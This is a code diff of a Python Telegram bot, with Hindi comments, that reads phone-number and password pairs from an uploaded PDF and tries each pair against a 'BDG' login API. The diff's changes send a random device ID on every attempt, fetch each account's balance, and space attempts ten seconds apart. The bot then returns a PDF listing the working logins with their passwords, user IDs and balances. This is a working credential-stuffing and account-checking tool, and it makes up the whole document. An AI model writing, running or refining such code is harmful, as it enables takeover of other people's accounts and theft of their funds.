@@ -1,11 +1,9 @@
 import requests, json, time, re, io, threading, base64
 import hashlib
 import uuid
-import PyPDF2
+from pypdf import PdfReader
 from reportlab.lib.pagesizes import A4
-from reportlab.platypus import SimpleDocTemplate, Table, TableStyle
-from reportlab.lib import colors
-from reportlab.lib.units import inch
+from reportlab.pdfgen import canvas
 
 # ══════════════════════════════════════════════════════
 # TELEGRAM BOT
@@ -50,73 +48,44 @@ def generate_signature(payload):
 
 
 # ══════════════════════════════════════════════════════
-# HELPERS (bot51.py style)
-# ══════════════════════════════════════════════════════
-def clean_string(text):
-    if not text: return text
-    text = str(text).strip()
-    if text.startswith("'"): text = text[1:]
-    if text.endswith("'"): text = text[:-1]
-    return text.strip()
-
-def clean_phone(phone_str):
-    phone_str = clean_string(phone_str)
-    digits = re.sub(r'\D', '', str(phone_str))
-    if len(digits) == 12 and digits.startswith('91'): return digits[2:]
-    if len(digits) == 10: return digits
-    if len(digits) > 10: return digits[-10:]
-    return None
-
-def clean_password(password_str):
-    return clean_string(password_str)
-
-
-# ══════════════════════════════════════════════════════
-# PDF -> LIST of (phone, pass)  [bot51.py style with PyPDF2]
+# PDF -> LIST of (phone, pass)
 # ══════════════════════════════════════════════════════
 def extract_pairs_from_pdf(pdf_bytes):
-    credentials = []
-    current_phone = None
-    current_password = None
+    reader = PdfReader(io.BytesIO(pdf_bytes))
+    text = ""
+    for p in reader.pages:
+        text += (p.extract_text() or "") + "\n"
 
-    pdf_file = io.BytesIO(pdf_bytes)
-    reader = PyPDF2.PdfReader(pdf_file)
+    print("── PDF TEXT ──\n", text, "\n──────────────")
+    pairs, seen = [], set()
 
-    for page in reader.pages:
-        text = page.extract_text()
-        if not text: continue
+    for line in text.splitlines():
+        line = line.strip()
+        if not line: continue
+        for m in re.finditer(r'(?<!\d)(\d{10})(?!\d)', line):
+            phone = m.group(1)
+            if phone in seen: continue
+            rest = line[m.end():].strip()
+            for t in rest.split():
+                if re.fullmatch(r'\d+(\.\d+)?', t): continue
+                seen.add(phone)
+                pairs.append((phone, t))
+                break
 
-        for line in text.split('\n'):
-            line = clean_string(line.strip())
-            if not line: continue
-
-            numbers = re.findall(r'\b\d{10}\b', line)
-            if numbers:
-                for num in numbers:
-                    cleaned = clean_phone(num)
-                    if cleaned:
-                        if current_phone and current_password:
-                            credentials.append((current_phone, current_password))
-                        current_phone = cleaned
-                        current_password = None
-                        remaining = re.sub(r'\b\d{10}\b', '', line).strip()
-                        if remaining:
-                            current_password = clean_password(remaining)
-            else:
-                cleaned_line = clean_password(line)
-                if current_phone and not current_password:
-                    current_password = cleaned_line
-                elif current_phone and current_password:
-                    credentials.append((current_phone, current_password))
-                    current_phone = None
-                    current_password = None
-
-        if current_phone and current_password:
-            credentials.append((current_phone, current_password))
-            current_phone = None
-            current_password = None
-
-    return credentials
+    if not pairs:
+        tokens = text.split()
+        i = 0
+        while i < len(tokens):
+            t = tokens[i]
+            if re.fullmatch(r'\d{10}', t) and t not in seen:
+                for j in range(i + 1, min(i + 6, len(tokens))):
+                    nxt = tokens[j]
+                    if not re.fullmatch(r'\d+(\.\d+)?', nxt):
+                        seen.add(t)
+                        pairs.append((t, nxt))
+                        break
+            i += 1
+    return pairs
 
 
 # ══════════════════════════════════════════════════════
@@ -146,7 +115,7 @@ def decode_jwt_payload(token):
 
 
 # ══════════════════════════════════════════════════════
-# BDG LOGIN (Random Device ID + 91 Prefix + Balance)
+# BDG LOGIN (UPDATED: Random Device ID & 91 Prefix)
 # ══════════════════════════════════════════════════════
 def do_login(phone, password):
     phone_str = str(phone).strip()
@@ -159,10 +128,11 @@ def do_login(phone, password):
     except Exception:
         pass
 
+    # 🔥 Random Device ID generate karo
     random_device_id = uuid.uuid4().hex
 
     payload = {
-        "deviceId":  random_device_id,
+        "deviceId":  random_device_id, # <-- Ab random jayega
         "username":  phone_str,
         "pwd":       password,
         "phonetype": 1,
@@ -174,7 +144,7 @@ def do_login(phone, password):
         "packId": "",
         "pxelId": "",
     }
-
+    
     payload["random"] = uuid.uuid4().hex
     payload["signature"] = generate_signature(payload)
     payload["timestamp"] = int(time.time())
@@ -199,89 +169,110 @@ def do_login(phone, password):
     if not uid:
         uid = (inner.get("userId") or find_key(data, "userId")
                or find_key(data, "user_id") or find_key(data, "uid"))
-
+    
     balance = "0.00"
     if sk:
         try:
             info_headers = headers.copy()
             info_headers["Authorization"] = f"Bearer {sk}"
-
-            info_payload = {
-                "signature": sk,
-                "deviceId": random_device_id
-            }
-
+            info_payload = {"signature": sk}
+            
             info_r = s.post(GET_USERINFO_API, json=info_payload, headers=info_headers, timeout=30)
             info_data = info_r.json()
-
+            
             if info_data.get("code") == 0:
-                balance = find_key(info_data, "amount")
-                if balance is None:
-                    balance = "0.00"
-            else:
-                print(f"❌ GetUserInfo Failed for {phone_str}. Response: {info_data}")
-
+                inner_info = info_data.get("data") or {}
+                balance = inner_info.get("amount") or "0.00"
         except Exception as e:
-            print(f"❌ GetUserInfo Exception for {phone_str}: {e}")
+            print(f"GetUserInfo Error for {phone_str}: {e}")
 
     return s, sk, uid, balance, data
 
 
 # ══════════════════════════════════════════════════════
-# REPORT PDF — successful logins  [bot51.py style with Table]
+# REPORT PDF
 # ══════════════════════════════════════════════════════
 def make_report_pdf(success_list, fail_list):
-    pdf_buf = io.BytesIO()
-    doc = SimpleDocTemplate(pdf_buf, pagesize=A4)
-    elements = []
+    buf = io.BytesIO()
+    c = canvas.Canvas(buf, pagesize=A4)
+    w, h = A4
 
-    # ---------- SUCCESS TABLE ----------
-    if success_list:
-        data = [['Phone Number', 'Password', 'User ID', 'Balance']]
-        for phone, pwd, uid, bal in success_list:
-            data.append([str(phone), str(pwd), str(uid), f"Rs {bal}"])
+    y = h - 60
+    c.setFont("Helvetica-Bold", 16)
+    c.drawString(50, y, "Successful Logins")
+    y -= 10
+    c.setFont("Helvetica", 10)
+    c.drawString(50, y, f"Total: {len(success_list)}")
+    y -= 25
 
-        table = Table(data, colWidths=[1.8*inch, 1.5*inch, 1.2*inch, 1.2*inch], repeatRows=1)
-        table.setStyle(TableStyle([
-            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
-            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
-            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-            ('FONTSIZE', (0, 0), (-1, 0), 10),
-            ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
-            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-            ('GRID', (0, 0), (-1, -1), 0.5, colors.black),
-            ('FONTSIZE', (0, 1), (-1, -1), 9),
-        ]))
-        elements.append(table)
+    c.setFont("Helvetica-Bold", 11)
+    c.drawString(50, y, "Phone")
+    c.drawString(160, y, "Password")
+    c.drawString(280, y, "User ID")
+    c.drawString(400, y, "Balance")
+    y -= 8
+    c.line(50, y, 550, y)
+    y -= 16
 
-    # ---------- FAIL TABLE ----------
+    c.setFont("Helvetica", 11)
+    for phone, pwd, uid, bal in success_list:
+        if y < 60:
+            c.showPage()
+            y = h - 60
+            c.setFont("Helvetica-Bold", 11)
+            c.drawString(50, y, "Phone")
+            c.drawString(160, y, "Password")
+            c.drawString(280, y, "User ID")
+            c.drawString(400, y, "Balance")
+            y -= 8
+            c.line(50, y, 550, y)
+            y -= 16
+            c.setFont("Helvetica", 11)
+        c.drawString(50, y, str(phone))
+        c.drawString(160, y, str(pwd))
+        c.drawString(280, y, str(uid))
+        c.drawString(400, y, f"Rs {bal}")
+        y -= 20
+
     if fail_list:
-        if success_list:
-            from reportlab.platypus import Spacer
-            elements.append(Spacer(1, 0.4 * inch))
+        c.showPage()
+        y = h - 60
+        c.setFont("Helvetica-Bold", 16)
+        c.drawString(50, y, "Failed Logins")
+        y -= 10
+        c.setFont("Helvetica", 10)
+        c.drawString(50, y, f"Total: {len(fail_list)}")
+        y -= 25
 
-        fdata = [['Phone Number', 'Password', 'Reason']]
+        c.setFont("Helvetica-Bold", 11)
+        c.drawString(50, y, "Phone")
+        c.drawString(200, y, "Password")
+        c.drawString(360, y, "Reason")
+        y -= 8
+        c.line(50, y, 550, y)
+        y -= 16
+
+        c.setFont("Helvetica", 11)
         for phone, pwd, reason in fail_list:
-            fdata.append([str(phone), str(pwd), str(reason)[:40]])
+            if y < 60:
+                c.showPage()
+                y = h - 60
+                c.setFont("Helvetica-Bold", 11)
+                c.drawString(50, y, "Phone")
+                c.drawString(200, y, "Password")
+                c.drawString(360, y, "Reason")
+                y -= 8
+                c.line(50, y, 550, y)
+                y -= 16
+                c.setFont("Helvetica", 11)
+            c.drawString(50, y, str(phone))
+            c.drawString(200, y, str(pwd))
+            c.drawString(360, y, str(reason)[:35])
+            y -= 20
 
-        ftable = Table(fdata, colWidths=[1.8*inch, 1.5*inch, 2.4*inch], repeatRows=1)
-        ftable.setStyle(TableStyle([
-            ('BACKGROUND', (0, 0), (-1, 0), colors.darkred),
-            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
-            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-            ('FONTSIZE', (0, 0), (-1, 0), 10),
-            ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
-            ('BACKGROUND', (0, 1), (-1, -1), colors.lightpink),
-            ('GRID', (0, 0), (-1, -1), 0.5, colors.black),
-            ('FONTSIZE', (0, 1), (-1, -1), 9),
-        ]))
-        elements.append(ftable)
-
-    doc.build(elements)
-    pdf_buf.seek(0)
-    return pdf_buf.read()
+    c.save()
+    buf.seek(0)
+    return buf.read()
 
 
 # ══════════════════════════════════════════════════════
@@ -319,7 +310,7 @@ def get_file_bytes(file_id):
 
 
 # ══════════════════════════════════════════════════════
-# WORKER (10 Second Delay)
+# WORKER (UPDATED: 10 Second Delay)
 # ══════════════════════════════════════════════════════
 def process_pairs(chat_id, prog_id, pairs):
     total = len(pairs)
@@ -350,11 +341,12 @@ def process_pairs(chat_id, prog_id, pairs):
         eta = int((time.time() - t0) / i * (total - i))
         edit_msg(chat_id, prog_id,
             f"⚙️ Processing... {i}/{total}\n"
-            f"✅ Success: {done}   ❌ Fail: {bad}\n"
+            f"✅ Success: {done} ❌ Fail: {bad}\n"
             f"⏱️ ETA ~{eta}s\n"
             f"<i>/stop bhejo rokne ke liye</i>")
 
         if i < total:
+            # 🔥 10 Second Delay (1-1 second ke loop me, taaki /stop kaam kare)
             for _ in range(10):
                 if STOP_FLAG["stop"] and STOP_FLAG["chat_id"] == chat_id:
                     stopped = True
@@ -368,8 +360,8 @@ def process_pairs(chat_id, prog_id, pairs):
     pdf_out = make_report_pdf(success_list, fail_list)
     tag = "⏹️ <b>STOPPED</b>" if stopped else "🎉 <b>Ho gaya!</b>"
     send_doc(chat_id, "logins_report.pdf", pdf_out,
-             caption=f"{tag}\nTotal: {total}   Processed: {done + bad}\n"
-                     f"✅ Success: {done}   ❌ Fail: {bad}")
+             caption=f"{tag}\nTotal: {total} Processed: {done + bad}\n"
+                     f"✅ Success: {done} ❌ Fail: {bad}")
 
     edit_msg(chat_id, prog_id,
         f"{tag}\nTotal: {total}\nProcessed: {done + bad}\n"
